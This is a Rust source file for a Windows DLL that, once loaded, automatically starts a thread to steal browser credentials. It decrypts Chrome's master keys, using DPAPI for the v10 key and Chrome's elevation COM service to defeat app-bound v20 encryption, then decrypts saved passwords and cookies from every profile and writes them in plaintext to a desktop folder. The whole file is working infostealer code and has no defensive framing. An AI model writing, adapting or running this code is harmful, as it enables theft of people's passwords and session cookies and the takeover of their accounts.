use std::fs;
use std::io::Write;
use std::path::{Path, PathBuf};
use std::ptr;
use std::thread;
use std::time::{SystemTime, UNIX_EPOCH};

use serde_json::Value;
use winapi::{
    shared::{
        guiddef::GUID,
        minwindef::UINT,
        wtypes::BSTR,
        wtypesbase::CLSCTX_LOCAL_SERVER,
    },
    um::{
        combaseapi::{CoCreateInstance, CoInitializeEx, CoSetProxyBlanket},
        objbase::COINIT_APARTMENTTHREADED,
        oleauto::{SysAllocStringByteLen, SysFreeString, SysStringByteLen},
        winnt::DLL_PROCESS_ATTACH,
        dpapi::CryptUnprotectData,
        wincrypt::DATA_BLOB,
    },
    ctypes::c_void,
};

use aes_gcm::{
    aead::{Aead, KeyInit},
    Aes256Gcm, Nonce,
};

// Chrome 144+ için CLSID (aynı kalıyor)
const CLSID_ELEVATOR: GUID = GUID {
    Data1: 0x708860E0,
    Data2: 0xF641,
    Data3: 0x4611,
    Data4: [0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B],
};

const IID_IELEVATOR2: GUID = GUID {
    Data1: 0x1BF5208B,
    Data2: 0x295F,
    Data3: 0x4992,
    Data4: [0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38],
};

#[repr(C)]
struct IElevatorVTbl {
    QueryInterface: unsafe extern "system" fn(*mut c_void, *const GUID, *mut *mut c_void) -> i32,
    AddRef: unsafe extern "system" fn(*mut c_void) -> u32,
    Release: unsafe extern "system" fn(*mut c_void) -> u32,
    RunRecoveryCRXElevated: unsafe extern "system" fn(*mut c_void, *const u16, *const u16, *const u16, u32, *mut u32) -> i32,
    EncryptData: unsafe extern "system" fn(*mut c_void, u32, BSTR, *mut BSTR, *mut u32) -> i32,
    DecryptData: unsafe extern "system" fn(*mut c_void, BSTR, *mut BSTR, *mut u32) -> i32,
}

fn log_message(msg: &str) -> Result<(), std::io::Error> {
    let desktop = std::env::var("USERPROFILE")
        .map(|p| PathBuf::from(p).join("Desktop").join("log.txt"))
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;

    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();

    let mut file = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(desktop)?;

    writeln!(file, "[{}] {}", timestamp, msg)?;
    Ok(())
}

fn decrypt_dpapi(data: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let mut input = DATA_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };
        let mut output = DATA_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        if CryptUnprotectData(&mut input, ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(), 0, &mut output) != 0 {
            let result = std::slice::from_raw_parts(output.pbData, output.cbData as usize).to_vec();
            winapi::um::winbase::LocalFree(output.pbData as *mut c_void);
            Ok(result)
        } else {
            Err(format!("CryptUnprotectData failed: {}", winapi::um::errhandlingapi::GetLastError()))
        }
    }
}

fn decrypt_with_elevator(encrypted_blob: &[u8]) -> Result<Vec<u8>, String> {
    unsafe {
        let hr = CoInitializeEx(ptr::null_mut(), COINIT_APARTMENTTHREADED);
        let co_init = hr >= 0 || hr as u32 == 0x80010106;
        if !co_init {
            return Err(format!("CoInitializeEx başarısız: 0x{:08X}", hr as u32));
        }

        let result = (|| {
            let mut elevator_ptr: *mut c_void = ptr::null_mut();
            let hr = CoCreateInstance(&CLSID_ELEVATOR, ptr::null_mut(), CLSCTX_LOCAL_SERVER, &IID_IELEVATOR2, &mut elevator_ptr);

            if hr < 0 {
                return Err(format!("CoCreateInstance başarısız: 0x{:08X}", hr as u32));
            }

            let hr_blanket = CoSetProxyBlanket(elevator_ptr as *mut winapi::um::unknwnbase::IUnknown, 10, 0, ptr::null_mut(), 6, 3, ptr::null_mut(), 0x40);
            if hr_blanket < 0 {
                let _ = log_message(&format!("CoSetProxyBlanket başarısız: 0x{:08X}", hr_blanket as u32));
            }

            let bstr_encrypted = SysAllocStringByteLen(encrypted_blob.as_ptr() as *const i8, encrypted_blob.len() as UINT);
            if bstr_encrypted.is_null() {
                let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
                ((*vtable).Release)(elevator_ptr);
                return Err("SysAllocStringByteLen başarısız".to_string());
            }

            let mut bstr_decrypted: BSTR = ptr::null_mut();
            let mut last_error: u32 = 0;
            let vtable = *(elevator_ptr as *const *const IElevatorVTbl);
            let hr = ((*vtable).DecryptData)(elevator_ptr, bstr_encrypted, &mut bstr_decrypted, &mut last_error);

            SysFreeString(bstr_encrypted);

            if hr < 0 {
                ((*vtable).Release)(elevator_ptr);
                return Err(format!("DecryptData başarısız: 0x{:08X}, last_error: {}", hr as u32, last_error));
            }

            let byte_len = SysStringByteLen(bstr_decrypted) as usize;
            let decrypted = std::slice::from_raw_parts(bstr_decrypted as *const u8, byte_len).to_vec();
            SysFreeString(bstr_decrypted);
            ((*vtable).Release)(elevator_ptr);

            Ok(decrypted)
        })();

        if hr >= 0 {
            winapi::um::combaseapi::CoUninitialize();
        }
        result
    }
}

fn aes_gcm_decrypt(key: &[u8], data: &[u8]) -> Result<Vec<u8>, String> {
    if data.len() < 15 { return Err("Data too short".to_string()); }
    let nonce = Nonce::from_slice(&data[3..15]);
    let ciphertext = &data[15..];
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|e| e.to_string())?;
    cipher.decrypt(nonce, ciphertext).map_err(|e| e.to_string())
}

fn do_work() -> Result<(), Box<dyn std::error::Error>> {
    let user_profile = std::env::var("USERPROFILE")?;
    let chrome_data_path = Path::new(&user_profile).join("AppData\\Local\\Google\\Chrome\\User Data");
    let desktop_db_path = Path::new(&user_profile).join("Desktop\\chrome_db");
    fs::create_dir_all(&desktop_db_path)?;

    let local_state_path = chrome_data_path.join("Local State");
    let content = fs::read_to_string(&local_state_path)?;
    let json: Value = serde_json::from_str(&content)?;

    let mut master_keys_file = fs::File::create(desktop_db_path.join("master_keys.txt"))?;

    // v10 Key
    let mut v10_key = Vec::new();
    if let Some(os_crypt) = json.get("os_crypt") {
        if let Some(key_b64) = os_crypt.get("encrypted_key").and_then(|v| v.as_str()) {
            use base64::engine::Engine as _;
            let encrypted_key = base64::engine::general_purpose::STANDARD.decode(key_b64)?;
            if encrypted_key.starts_with(b"DPAPI") {
                v10_key = decrypt_dpapi(&encrypted_key[5..])?;
                writeln!(master_keys_file, "v10 Master Key (hex): {}", v10_key.iter().map(|b| format!("{:02x}", b)).collect::<String>())?;
            }
        }
    }

    // v20 Key (App-Bound)
    let mut v20_key = Vec::new();
    let key_b64 = json.get("app_bound_encrypted_key").and_then(|v| v.as_str())
        .or_else(|| json.get("os_crypt").and_then(|oc| oc.get("app_bound_encrypted_key")).and_then(|v| v.as_str()));

    if let Some(b64) = key_b64 {
        use base64::engine::Engine as _;
        let decoded = base64::engine::general_purpose::STANDARD.decode(b64)?;
        let blob = if decoded.starts_with(b"APPB") { &decoded[4..] } else { &decoded };
        match decrypt_with_elevator(blob) {
            Ok(k) => {
                v20_key = k;
                writeln!(master_keys_file, "v20 Master Key (hex): {}", v20_key.iter().map(|b| format!("{:02x}", b)).collect::<String>())?;
            }
            Err(e) => writeln!(master_keys_file, "v20 Master Key Error: {}", e)?,
        }
    }

    let mut profiles = vec!["Default".to_string()];
    if let Ok(entries) = fs::read_dir(&chrome_data_path) {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with("Profile ") {
                profiles.push(name);
            }
        }
    }
    profiles.sort_by_key(|s| if s == "Default" { 0 } else { s[8..].parse::<u32>().unwrap_or(999) });

    for profile in profiles {
        let profile_path = chrome_data_path.join(&profile);
        let profile_output_path = desktop_db_path.join(&profile);
        fs::create_dir_all(&profile_output_path)?;

        let mut results_file = fs::File::create(profile_output_path.join("decrypted_data.txt"))?;
        writeln!(results_file, "=== Profile: {} ===", profile)?;

        // Passwords
        let login_db = profile_path.join("Login Data");
        if login_db.exists() {
            let temp_db = std::env::temp_dir().join(format!("chrome_login_{}.db", profile));
            let _ = fs::copy(&login_db, &temp_db);
            if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
                if let Ok(mut stmt) = conn.prepare("SELECT origin_url, username_value, password_value FROM logins") {
                    let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)))?;
                    writeln!(results_file, "\n--- Passwords ---")?;
                    for row in rows.flatten() {
                        let (url, user, pass_blob) = row;
                        let pass = if pass_blob.len() > 15 {
                            let key = if pass_blob.starts_with(b"v20") { &v20_key } else { &v10_key };
                            if !key.is_empty() {
                                aes_gcm_decrypt(key, &pass_blob).unwrap_or_else(|_| b"[Decryption Failed]".to_vec())
                            } else { b"[No Key]".to_vec() }
                        } else { b"[Blob Too Short]".to_vec() };
                        writeln!(results_file, "URL: {}\nUser: {}\nPass: {}\n", url, user, String::from_utf8_lossy(&pass))?;
                    }
                }
            }
            let _ = fs::remove_file(temp_db);
        }

        // Cookies
        let cookie_db = profile_path.join("Network\\Cookies");
        if cookie_db.exists() {
            let temp_db = std::env::temp_dir().join(format!("chrome_cookies_{}.db", profile));
            let _ = fs::copy(&cookie_db, &temp_db);
            if let Ok(conn) = rusqlite::Connection::open(&temp_db) {
                if let Ok(mut stmt) = conn.prepare("SELECT host_key, name, encrypted_value FROM cookies") {
                    let rows = stmt.query_map([], |row| Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?, row.get::<_, Vec<u8>>(2)?)))?;
                    writeln!(results_file, "\n--- Cookies ---")?;
                    for row in rows.flatten() {
                        let (host, name, blob) = row;
                        if blob.len() > 15 {
                            let is_v20 = blob.starts_with(b"v20");
                            let key = if is_v20 { &v20_key } else { &v10_key };
                            if !key.is_empty() {
                                if let Ok(decrypted) = aes_gcm_decrypt(key, &blob) {
                                    let val = if is_v20 && decrypted.len() > 32 { &decrypted[32..] } else { &decrypted[..] };
                                    writeln!(results_file, "Host: {} | Name: {} | Value: {}", host, name, String::from_utf8_lossy(val))?;
                                }
                            }
                        }
                    }
                }
            }
            let _ = fs::remove_file(temp_db);
        }
    }
    Ok(())
}

#[no_mangle]
pub extern "system" fn DllMain(_hinst: *mut std::ffi::c_void, fdw_reason: u32, _lpv_reserved: *mut std::ffi::c_void) -> i32 {
    if fdw_reason == DLL_PROCESS_ATTACH {
        thread::spawn(|| {
            let _ = do_work().map_err(|e| { let _ = log_message(&format!("HATA: {}", e)); });
        });
    }
    1
}
